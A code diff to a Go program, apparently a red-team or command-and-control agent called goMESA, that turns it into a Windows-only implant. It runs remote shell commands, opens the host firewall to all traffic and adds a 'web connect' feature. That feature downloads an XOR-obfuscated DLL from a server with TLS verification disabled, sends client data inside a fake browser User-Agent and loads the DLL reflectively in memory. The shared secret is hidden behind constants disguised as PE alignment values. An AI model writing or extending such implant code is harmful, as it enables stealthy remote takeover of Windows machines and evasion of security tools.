@@ -1,18 +1,28 @@
+//go:build windows
+// +build windows
+
 package main
 
 import (
 	"bytes"
+	"crypto/tls"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"goMESA/internal/agent_env"
+	"goMESA/internal/common"
+	"goMESA/internal/reflective"
+	"golang.org/x/sys/windows"
+	"io/ioutil"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
-	"runtime"
 	"strings"
+	"syscall"
 	"time"
-
-	"goMESA/internal/common"
+	"unsafe"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
@@ -20,11 +30,13 @@ import (
 
 var serverIP string
 
+// PayloadMetadata represents additional data embedded with a payload
+type PayloadMetadata struct {
+	FunctionName string `json:"function_name"` // Name of the function to execute in the DLL
+}
+
 // AgentInfo stores information about the current agent
 type AgentInfo struct {
-	OperatingSystem string
-	ShellType       string
-	ShellFlag       string
 	NetworkAdapter  string
 	ServerIP        net.IP
 	MyIP            net.IP
@@ -36,14 +48,20 @@ type AgentInfo struct {
 // Global agent instance
 var agent *AgentInfo
 
+// Constants for obfuscation
+const (
+	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp" in ASCII
+	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k" in ASCII
+	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v" in ASCII
+	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue" in ASCII
+	PE_CHECKSUM_SEED          = 0x67891011
+)
+
 func init() {
 	agent = &AgentInfo{
 		HeartbeatActive: true,
 		LastHeartbeat:   time.Now(),
 	}
-
-	// Detect OS and set shell info
-	agent.OperatingSystem, agent.ShellType, agent.ShellFlag = detectOS()
 
 	// Get network adapter
 	agent.NetworkAdapter = getNetworkAdapter()
@@ -62,83 +80,30 @@ func init() {
 	agent.AgentID = fmt.Sprintf("%s", agent.MyIP)
 }
 
-// detectOS determines the operating system and shell to use
-func detectOS() (string, string, string) {
-	var operatingSystem, shell, flag string
-
-	switch runtime.GOOS {
-	case "windows":
-		operatingSystem = "Windows"
-		shell = "cmd"
-		flag = "/c"
-	case "linux":
-		operatingSystem = "Linux"
-		shell = "/bin/sh"
-		flag = "-c"
-	case "darwin":
-		operatingSystem = "macOS"
-		shell = "/bin/sh"
-		flag = "-c"
-	default:
-		fmt.Println("Operating system not detected")
-		os.Exit(1)
-	}
-
-	return operatingSystem, shell, flag
-}
-
 // getNetworkAdapter determines the network interface to use for packet capture
 func getNetworkAdapter() string {
-	if runtime.GOOS == "windows" {
-		// Windows-specific adapter detection
-		cmd := exec.Command("cmd", "/c", "getmac /fo csv /v | findstr Ethernet")
-		output, err := cmd.Output()
-		if err != nil {
-			log.Printf("Error getting network adapter: %v", err)
-			return ""
-		}
-
-		// Parse the output to get the adapter ID
-		text := string(output)
-		startIndex := strings.Index(text, "_{")
-		if startIndex == -1 {
-			return ""
-		}
-
-		finalIndex := strings.Index(text[startIndex:], "}")
-		if finalIndex == -1 {
-			return ""
-		}
-
-		temp := text[startIndex+2 : startIndex+finalIndex]
-		return fmt.Sprintf("\\Device\\NPF_{%s}", temp)
-	}
-
-	// For Linux/macOS
-	potentialInterfaces := []string{"eth0", "en0", "ens33"}
-	devices, err := net.Interfaces()
+	// Windows-specific adapter detection
+	cmd := exec.Command("cmd", "/c", "getmac /fo csv /v | findstr Ethernet")
+	output, err := cmd.Output()
 	if err != nil {
-		log.Printf("Error gathering network interfaces: %v", err)
-		return "eth0" // Default fallback
+		log.Printf("Error getting network adapter: %v", err)
+		return ""
 	}
 
-	// Try to find a matching interface
-	for _, device := range devices {
-		for _, potential := range potentialInterfaces {
-			if strings.Contains(strings.ToLower(device.Name), strings.ToLower(potential)) {
-				return device.Name
-			}
-		}
+	// Parse the output to get the adapter ID
+	text := string(output)
+	startIndex := strings.Index(text, "_{")
+	if startIndex == -1 {
+		return ""
 	}
 
-	// Default to first non-loopback interface if none of the expected ones are found
-	for _, device := range devices {
-		if (device.Flags&net.FlagLoopback) == 0 && (device.Flags&net.FlagUp) != 0 {
-			return device.Name
-		}
+	finalIndex := strings.Index(text[startIndex:], "}")
+	if finalIndex == -1 {
+		return ""
 	}
 
-	return "eth0" // Final fallback
+	temp := text[startIndex+2 : startIndex+finalIndex]
+	return fmt.Sprintf("\\Device\\NPF_{%s}", temp)
 }
 
 // getLocalIP gets the agent's local IP address
@@ -160,37 +125,22 @@ func getLocalIP() net.IP {
 	return nil
 }
 
-// setup performs initial agent setup based on the OS
+// setup performs initial agent setup
 func setup() {
-	fmt.Printf("Setting up agent on %s\n", agent.OperatingSystem)
+	fmt.Printf("Setting up agent on Windows\n")
 
 	strIP := agent.ServerIP.String()
-	var commands []string
-
-	switch agent.OperatingSystem {
-	case "Windows":
-		commands = []string{
-			"net start w32time",
-			"sc config w32time start=auto",
-			"netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
-			"w32tm /config /syncfromflags:manual /manualpeerlist:" + strIP + " /update",
-			"w32tm /resync",
-		}
-	case "Linux":
-		commands = []string{
-			"apt-get install sntp -y",
-			"apt-get install libpcap-dev -y",
-			"sntp -s " + strIP,
-		}
-	case "macOS":
-		commands = []string{
-			"sntp -s " + strIP,
-		}
+	commands := []string{
+		"net start w32time",
+		"sc config w32time start=auto",
+		"netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
+		"w32tm /config /syncfromflags:manual /manualpeerlist:" + strIP + " /update",
+		"w32tm /resync",
 	}
 
 	// Execute setup commands
 	for _, cmd := range commands {
-		output, err := exec.Command(agent.ShellType, agent.ShellFlag, cmd).Output()
+		output, err := exec.Command("cmd", "/c", cmd).Output()
 		if err != nil {
 			log.Printf("Failed to execute command %s: %v", cmd, err)
 			continue
@@ -202,7 +152,7 @@ func setup() {
 // runCommand executes a shell command and returns the output
 func runCommand(command string) string {
 	fmt.Printf("Executing command: %s\n", command)
-	cmd := exec.Command(agent.ShellType, agent.ShellFlag, command)
+	cmd := exec.Command("cmd", "/c", command)
 
 	var outBuf, errBuf bytes.Buffer
 	cmd.Stdout = &outBuf
@@ -304,7 +254,7 @@ func startSniffer() {
 		// Check if we have a valid command type
 		validCommand := false
 		switch commandType {
-		case common.CommandContinued, common.CommandDone, common.CommandKill, common.CommandPing:
+		case common.CommandContinued, common.CommandDone, common.CommandKill, common.CommandPing, common.CommandWebConnect:
 			validCommand = true
 		}
 
@@ -371,15 +321,8 @@ func startSniffer() {
 		case common.CommandKill:
 			// Kill the agent
 			log.Printf("DEBUG-COMMAND-10: Received kill command. Shutting down...")
-
-			if agent.OperatingSystem == "Windows" {
-				runCommand("net stop w32time")
-				runCommand("w32tm /unregister")
-			} else {
-				// Linux/macOS cleanup
-				runCommand("sudo systemctl stop ntp")
-			}
-
+			runCommand("net stop w32time")
+			runCommand("w32tm /unregister")
 			agent.HeartbeatActive = false
 			os.Exit(0)
 
@@ -423,7 +366,7 @@ func startSniffer() {
 func main() {
 	// Print debug info
 	fmt.Printf("Agent started with ID: %s\n", agent.AgentID)
-	fmt.Printf("Operating System: %s\n", agent.OperatingSystem)
+	fmt.Printf("Operating System: Windows\n")
 	fmt.Printf("Network Adapter: %s\n", agent.NetworkAdapter)
 	fmt.Printf("Server IP: %s\n", agent.ServerIP)
 	fmt.Printf("My IP: %s\n", agent.MyIP)
@@ -438,6 +381,88 @@ func main() {
 	startSniffer()
 }
 
+// getPESectionAlignmentString constructs part of our shared secret
+func getPESectionAlignmentString() string {
+	buffer := make([]byte, 16)
+	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
+	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
+	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
+	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
+	return string(buffer)
+}
+
+// verifyPEChecksumValue constructs the second part of our shared secret
+func verifyPEChecksumValue(seed uint32) string {
+	result := make([]byte, 4)
+	checksum := seed
+	for i := 0; i < 4; i++ {
+		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
+		result[i] = byte(checksum & 0xFF)
+	}
+	return string(result)
+}
+
+// generatePEValidationKey generates the shared secret key
+func generatePEValidationKey() string {
+	alignmentSignature := getPESectionAlignmentString()
+	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
+	return alignmentSignature + checksumSignature
+}
+
+// deriveKeyFromParams derives an encryption key from request parameters
+func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
+	combined := sharedSecret + timestamp + clientID
+	key := make([]byte, 32)
+	for i := 0; i < 32; i++ {
+		if i < len(combined) {
+			key[i] = combined[i]
+		} else {
+			key[i] = combined[i%len(combined)]
+		}
+	}
+	return string(key)
+}
+
+// deobfuscatePayload deobfuscates the payload using XOR with rolling key
+func deobfuscatePayload(data []byte, key string) ([]byte, PayloadMetadata, error) {
+	// Ensure data has at least 4 bytes for metadata length
+	if len(data) < 4 {
+		return nil, PayloadMetadata{}, fmt.Errorf("payload too short")
+	}
+
+	// Extract metadata length from first 4 bytes (unencrypted)
+	metadataLen := binary.LittleEndian.Uint32(data[0:4])
+
+	// Sanity check the metadata length
+	if metadataLen > 1024 || 4+metadataLen > uint32(len(data)) {
+		return nil, PayloadMetadata{}, fmt.Errorf("invalid metadata length: %d", metadataLen)
+	}
+
+	// Create result buffer for deobfuscated data
+	result := make([]byte, len(data)-4)
+	keyBytes := []byte(key)
+	keyLen := len(keyBytes)
+
+	// Deobfuscate everything after the length field
+	for i := 0; i < len(result); i++ {
+		// Calculate rolling key byte (must match server algorithm)
+		keyByte := keyBytes[i%keyLen] ^ byte((i+4)&0xFF)
+
+		// XOR to deobfuscate
+		result[i] = data[i+4] ^ keyByte
+	}
+
+	// Extract and parse metadata
+	metadataBytes := result[:metadataLen]
+	var metadata PayloadMetadata
+	if err := json.Unmarshal(metadataBytes, &metadata); err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("failed to parse metadata: %v", err)
+	}
+
+	// Return the actual payload (everything after metadata)
+	return result[metadataLen:], metadata, nil
+}
+
 // executeWebConnect handles the web connect command for reflective loading
 func executeWebConnect(payload common.WebConnectPayload) {
 	log.Printf("Executing web connect command to %s", payload.ServerURL)
@@ -445,16 +470,28 @@ func executeWebConnect(payload common.WebConnectPayload) {
 	// Create a response message to send back to the server
 	var responseMsg string
 
-	// TODO: Implement reflective loading logic here in Phase 2
-	// This will include:
-	// 1. Connecting to the HTTPS server
-	// 2. Downloading the obfuscated DLL
-	// 3. Extracting the function name from the payload metadata
-	// 4. Performing the reflective loading and execution
+	// Download and deobfuscate the payload
+	dllBytes, metadata, err := downloadPayload(payload.ServerURL)
+	if err != nil {
+		responseMsg = fmt.Sprintf("Failed to download payload: %v", err)
+		log.Printf("Error: %s", responseMsg)
+	} else {
+		// Create a reflective loader instance
+		loader := reflective.NewReflectiveLoader()
 
-	// For now, just set a placeholder response
-	responseMsg = fmt.Sprintf("Web connect command received, but reflective loading not yet implemented. Target URL: %s",
-		payload.ServerURL)
+		// Perform reflective loading through the interface
+		success, err := loader.LoadAndExecuteDLL(dllBytes, metadata.FunctionName)
+		if err != nil {
+			responseMsg = fmt.Sprintf("Failed to load DLL: %v", err)
+			log.Printf("Error: %s", responseMsg)
+		} else if success {
+			responseMsg = fmt.Sprintf("Successfully executed function %s", metadata.FunctionName)
+			log.Printf("Success: %s", responseMsg)
+		} else {
+			responseMsg = fmt.Sprintf("Function %s executed but returned FALSE", metadata.FunctionName)
+			log.Printf("Warning: %s", responseMsg)
+		}
+	}
 
 	// Send the response back to the server
 	log.Printf("Sending response for web connect command")
@@ -466,4 +503,81 @@ func executeWebConnect(payload common.WebConnectPayload) {
 	} else {
 		log.Printf("Web connect response sent successfully")
 	}
+}
+
+// downloadPayload downloads and processes the payload from the server
+func downloadPayload(serverURL string) ([]byte, PayloadMetadata, error) {
+	fmt.Printf("[+] Connecting to server: %s\n", serverURL)
+
+	// Create HTTP client with TLS config (skip verification for simplicity)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   30 * time.Second,
+	}
+
+	// Get environmental ID and timestamp
+	clientID, err := agent_env.GetEnvironmentalID()
+	if err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("failed to get client ID: %v", err)
+	}
+
+	timestamp := fmt.Sprintf("%d", time.Now().Unix())
+	fmt.Printf("[+] Using timestamp: %s\n", timestamp)
+
+	// Create custom User-Agent with embedded parameters
+	customUA := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "+
+		"(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 rv:%s-%s",
+		timestamp, clientID)
+
+	// Create request
+	req, err := http.NewRequest("GET", serverURL, nil)
+	if err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("failed to create request: %v", err)
+	}
+
+	// Set headers
+	req.Header.Set("User-Agent", customUA)
+
+	// Send request
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// Check status code
+	if resp.StatusCode != http.StatusOK {
+		return nil, PayloadMetadata{}, fmt.Errorf("server returned error: %d", resp.StatusCode)
+	}
+
+	// Read response body
+	obfuscatedData, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("failed to read response body: %v", err)
+	}
+
+	fmt.Printf("[+] Downloaded %d bytes of obfuscated payload\n", len(obfuscatedData))
+
+	// Generate shared secret
+	sharedSecret := generatePEValidationKey()
+
+	// Derive key using the same method as the server
+	key := deriveKeyFromParams(timestamp, clientID, sharedSecret)
+
+	// Deobfuscate payload and extract metadata
+	fmt.Println("[+] Deobfuscating payload...")
+	dllBytes, metadata, err := deobfuscatePayload(obfuscatedData, key)
+	if err != nil {
+		return nil, PayloadMetadata{}, fmt.Errorf("failed to deobfuscate payload: %v", err)
+	}
+
+	fmt.Printf("[+] Successfully deobfuscated %d bytes of DLL data\n", len(dllBytes))
+	fmt.Printf("[+] Target function: %s\n", metadata.FunctionName)
+
+	return dllBytes, metadata, nil
 }
